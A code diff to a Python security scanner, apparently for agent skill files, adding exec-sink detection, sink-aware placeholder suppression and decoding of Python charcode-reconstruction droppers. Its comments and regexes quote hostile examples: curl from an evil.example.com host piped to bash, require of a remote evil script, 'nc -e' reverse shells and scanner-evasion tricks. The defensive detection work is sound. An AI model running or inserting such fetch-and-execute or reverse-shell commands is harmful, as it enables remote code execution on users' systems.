@@ -556,6 +556,75 @@ def _has_placeholder(line: str) -> bool:
     return any(p.search(line) for p in _PLACEHOLDER_PATTERNS)
 
 
+# A line is a LIVE execution sink when it invokes an interpreter on its
+# argument. Two families:
+#
+#  1. ALWAYS-SHELL Python sinks — they run their argument through ``/bin/sh
+#     -c`` and take NO ``shell=`` kwarg, so they are shell-exec REGARDLESS of
+#     the argument's SHAPE (a bare ``ast.Name`` / reassembled-variable arg is
+#     STILL shell-exec): ``os.system``, ``os.popen``/``os.popen2/3/4``,
+#     ``subprocess.getoutput``/``getstatusoutput``, ``commands.getoutput``/
+#     ``getstatusoutput``, ``popen2.popen2/3/4``, ``pty.spawn``,
+#     ``asyncio.create_subprocess_shell``.
+#  2. EXPLICIT-shell sinks — ``eval(``/``exec(`` (code-exec), and any
+#     ``subprocess.*(… shell=True)`` (the kwarg makes the string a shell
+#     command). Plus a raw shell pipeline that pipes into an interpreter
+#     (``… | bash|sh|zsh|python|node|perl|ruby``) or a ``nc … -e`` reverse
+#     shell — the ``.sh`` form with no Python wrapper.
+#
+# This is the FN-SAFE discriminator used by (a) the placeholder hard-suppress
+# (so a documentation placeholder like ``example.com`` can NEVER clear a line
+# whose string is executed) and (b) the charcode-reconstruction decoder (so a
+# reconstructed int list only fires when it actually feeds a sink). It is keyed
+# on the SINK STRUCTURE, never on an attacker-controllable signal (a variable
+# name, a comment, a raw-vs-plain string, a placeholder token).
+_EXEC_SINK_LINE_RE: re.Pattern[str] = re.compile(
+    r"""
+      \b(?:os\.)?system\s*\(                                # os.system(  /  system(
+    | \bos\.popen[234]?\s*\(                                # os.popen( os.popen2/3/4(
+    | \bpopen2\.popen[234]\s*\(                             # popen2.popen2/3/4(
+    | \b(?:subprocess|commands)\.get(?:status)?output\s*\(  # *.getoutput / getstatusoutput
+    | \bpty\.spawn\s*\(                                     # pty.spawn(
+    | \b(?:asyncio\.)?create_subprocess_shell\s*\(          # create_subprocess_shell(
+    | \beval\s*\(                                           # eval(
+    | \bexec\s*\(                                           # exec(
+    | \bshell\s*=\s*True\b                                  # subprocess.*(…, shell=True)
+    | \|\s*(?:bash|sh|zsh|dash|python[0-9.]*|node|perl|ruby)\b   # …| bash  (raw pipeline)
+    | \bnc\b[^\n|]*\s-e\b                                   # nc … -e  (reverse shell)
+    """,
+    re.IGNORECASE | re.VERBOSE,
+)
+
+
+def _line_is_exec_sink(line: str) -> bool:
+    """True when ``line`` invokes an interpreter on its argument (see
+    ``_EXEC_SINK_LINE_RE``). Bounded to ``_MAX_SCAN_LINE`` to match the
+    rest of the per-line scanners."""
+    if len(line) > _MAX_SCAN_LINE:
+        line = line[:_MAX_SCAN_LINE]
+    return bool(_EXEC_SINK_LINE_RE.search(line))
+
+
+# Proximity window (lines) for the charcode-reconstruction sink gate. The
+# canonical dropper assigns the reconstruction to a variable and executes it
+# one or two lines later, so a same-line gate misses it. A small symmetric
+# window catches the assign-then-exec form while staying tight enough that an
+# unrelated charcode list elsewhere in the file does not get falsely tied to a
+# distant sink.
+_CHARCODE_SINK_WINDOW: int = 3
+
+
+def _exec_sink_in_window(lines: list[str], line_idx: int, *, span: int) -> bool:
+    """True when any line within ``span`` lines of ``line_idx`` (inclusive,
+    both directions) is a live exec sink (``_line_is_exec_sink``)."""
+    lo = max(0, line_idx - span)
+    hi = min(len(lines) - 1, line_idx + span)
+    for i in range(lo, hi + 1):
+        if _line_is_exec_sink(lines[i]):
+            return True
+    return False
+
+
 def _has_doc_context(lines: list[str], line_idx: int, span: int = 5) -> bool:
     lo = max(0, line_idx - span)
     hi = min(len(lines) - 1, line_idx + span)
@@ -842,6 +911,22 @@ _EXECUTION_CLASS_RULES: frozenset[str] = frozenset(
         "RESOURCE_ABUSE",
         "SSRF_ADVANCED",  # SSRF needs an actual URL request — not a prose mention
         "NET_SUSPICIOUS",
+        # SECURITY (G5-skillaudit-supplychain-not-execclass): SUPPLY_CHAIN is an
+        # execution-class shape — ``require('https://evil/x.js')``,
+        # ``import … from 'https://evil'``, ``npm install evil && npm run …``,
+        # ``pip install evil && python …``, ``curl … | bash``. The module's own
+        # reachability model (the bypass-fix comment in
+        # ``_context_classifier_verdict``) keeps execution-class payloads VISIBLE
+        # in doc-only files because "a skill/command/hook can point the agent at
+        # any in-repo file and say 'run this recipe'" — that argument applies
+        # verbatim to a remote-load / install payload. Omitting SUPPLY_CHAIN let
+        # the doc-only carve-out HARD-SUPPRESS the ``require``/pure-``npm install``
+        # shapes (no CMD_INJECTION pattern covers them). Including it makes the
+        # carve-out DEMOTE (visible NIT) instead, matching CMD_INJECTION /
+        # SHELL_EXEC. It remains suppressible in genuinely-inert surfaces via the
+        # narrower content-keyed discriminators (markdown table cell, data-only
+        # fenced block, placeholder line that is NOT an exec sink).
+        "SUPPLY_CHAIN",
     }
 )
 
@@ -1551,10 +1636,27 @@ def _confidence(
     # ── Hard-suppress class: placeholder tokens make the match impossible ──
     # Run BEFORE the v2.100.0 context classifier so a documented
     # placeholder always suppresses, regardless of file type.
-    if _has_placeholder(line):
-        return "suppress"
-    if cb_map[line_idx] and _code_block_has_placeholder(lines, cb_ranges, line_idx):
-        return "suppress"
+    #
+    # SECURITY (RT4-example-com-placeholder-suppresses-supplychain): the
+    # placeholder hard-suppress is SINK-AWARE. A placeholder token
+    # (``example.com``, ``YOUR_API_KEY``, …) is a documentation signal ONLY
+    # in inert data — a comment, help/usage prose, a data literal. When the
+    # SAME physical line is a LIVE execution sink
+    # (``os.system("curl https://evil.example.com/x.sh | bash")``,
+    # ``curl … | bash``), the placeholder is attacker-supplied CONTENT sitting
+    # inside the very payload that runs — it is not inert and must not clear
+    # the finding. So if the line is an exec sink, we do NOT hard-suppress;
+    # we fall through to the context classifier / heuristic chain, which keeps
+    # execution-class matches visible (the same chain that keeps the
+    # real-domain sibling at ``keep``). This restores live-shell-exec
+    # detection while preserving EVERY benign-placeholder suppression
+    # (``# see https://api.example.com/v1``, ``url = "https://example.com"``).
+    # FN-safe: gated on the SINK STRUCTURE, never on the placeholder token.
+    if not _line_is_exec_sink(line):
+        if _has_placeholder(line):
+            return "suppress"
+        if cb_map[line_idx] and _code_block_has_placeholder(lines, cb_ranges, line_idx):
+            return "suppress"
     if re.search(r"`credentials\.json`", line):
         return "suppress"
 
@@ -2254,6 +2356,27 @@ _UNI_SEQ_RE = re.compile(r"(?:\\u[0-9a-fA-F]{4}){3,}")
 _CHARCODE_RE = re.compile(r"String\.fromCharCode\s*\(\s*([\d,\s]+)\s*\)", re.IGNORECASE)
 _ARR_CHARCODE_RE = re.compile(r"\[\s*(\d+(?:\s*,\s*\d+){2,})\s*\][\s.]*(?:map|forEach|reduce)", re.IGNORECASE)
 
+# SECURITY (RT4-charcode-recon-bypass): Python charcode-reconstruction idioms.
+# ``_ARR_CHARCODE_RE`` above only matches the JS ``[..].map/forEach/reduce``
+# form, so a Python ``"".join(chr(c) for c in [99,117,…])`` /
+# ``bytes([99,117,…]).decode()`` dropper was never decoded and the curl|bash it
+# reconstructs was never re-scanned — a clean false-negative. Each alternation
+# captures the int-list (group 1/2/3) so we can rebuild the bytes and feed them
+# to ``_scan_decoded``. The reconstruction CONTEXT (``chr``/``bytes``/
+# ``bytearray``) is part of the pattern, so a bare data list ``ports = [22, 80,
+# 443]`` never matches. This is the obfuscation DETECTOR; the firing GATE
+# (proximity to a live exec sink, see ``_decode_and_scan_escapes``) is what
+# keeps it FN-safe — a reconstructed string only blocks when it actually feeds
+# ``os.system``/``eval``/``exec``/``| bash``/… on the same line.
+_PY_CHARCODE_RECON_RE = re.compile(
+    r"""
+      (?:[\"']{1,3}\s*\.\s*join\s*\(\s*chr\s*\([^)]*\)[^[\]]*\[\s*(\d+(?:\s*,\s*\d+){2,})\s*\])  # "".join(chr(c) for c in [..])
+    | (?:[\"']{1,3}\s*\.\s*join\s*\(\s*map\s*\(\s*chr\s*,\s*\[\s*(\d+(?:\s*,\s*\d+){2,})\s*\])     # "".join(map(chr,[..]))
+    | (?:bytes(?:array)?\s*\(\s*\[\s*(\d+(?:\s*,\s*\d+){2,})\s*\]\s*\)\s*\.\s*decode)              # bytes([..]).decode() / bytearray([..]).decode()
+    """,
+    re.IGNORECASE | re.VERBOSE,
+)
+
 
 def _printable_ratio(s: str) -> float:
     if not s:
@@ -2287,7 +2410,13 @@ def _decode_and_scan_base64(lines: list[str]) -> list[dict[str, Any]]:
 def _decode_and_scan_escapes(lines: list[str]) -> list[dict[str, Any]]:
     findings: list[dict[str, Any]] = []
     for i, line in enumerate(lines):
-        if _has_placeholder(line):
+        # SECURITY (RT4): the placeholder skip is SINK-AWARE — a placeholder
+        # token on a LIVE exec sink is attacker-controlled content inside the
+        # executed payload, not an inert doc signal, so it must not let an
+        # obfuscated dropper (``os.system("".join(chr(c) for c in [..]))  #
+        # example.com``) skip decoding. Only skip the line when it is NOT an
+        # exec sink (genuine inert placeholder data).
+        if _has_placeholder(line) and not _line_is_exec_sink(line):
             continue
         # Hex escapes \x41\x42…
         for seq in _HEX_SEQ_RE.findall(line):
@@ -2332,6 +2461,38 @@ def _decode_and_scan_escapes(lines: list[str]) -> list[dict[str, Any]]:
                 except (ValueError, OverflowError):
                     continue
                 findings.extend(_scan_decoded(decoded, "CHARCODE_ARRAY", i, line))
+        # SECURITY (RT4-charcode-recon-bypass): Python charcode reconstruction —
+        # ``"".join(chr(c) for c in [..])`` / ``"".join(map(chr,[..]))`` /
+        # ``bytes([..]).decode()`` / ``bytearray([..]).decode()``. Unlike the JS
+        # ``[..].map`` form, these have NO interpreter-method suffix, so they
+        # were never decoded; the canonical dropper assigns the reconstruction
+        # to a variable and runs it one line later
+        # (``cmd = "".join(chr(c) for c in [..]); os.system(cmd)``).
+        #
+        # GATE (FN-safe, per the finder's "gated by proximity to an EXEC_SINK"):
+        # decode-and-rescan ONLY when a live exec sink
+        # (``os.system``/``eval``/``exec``/``| bash``/…) appears WITHIN A SMALL
+        # WINDOW of this line — covering the assign-then-exec form without
+        # firing on a charcode list that is nowhere near a sink. The actual
+        # finding is still emitted by ``_scan_decoded`` only when the rebuilt
+        # bytes contain a threat (curl/eval/shell/exfil-domain/…), so the AND of
+        # (charcode-reconstructed) ∧ (decodes-to-threat) ∧ (near-a-sink) is what
+        # fires — overwhelmingly malicious, and impossible to dodge by renaming
+        # the variable (the decoder rebuilds the real bytes regardless).
+        if _exec_sink_in_window(lines, i, span=_CHARCODE_SINK_WINDOW):
+            for py_match in _PY_CHARCODE_RECON_RE.finditer(line):
+                # The int-list is whichever capture group matched (1/2/3).
+                group = next((g for g in py_match.groups() if g), None)
+                if not group:
+                    continue
+                nums = re.findall(r"\d+", group)
+                if len(nums) >= 3 and all(0 <= int(n) <= 0x10FFFF for n in nums):
+                    try:
+                        decoded = "".join(chr(int(n)) for n in nums)
+                    except (ValueError, OverflowError):
+                        continue
+                    if _printable_ratio(decoded) >= 0.7:
+                        findings.extend(_scan_decoded(decoded, "CHARCODE", i, line))
     return findings
 
 
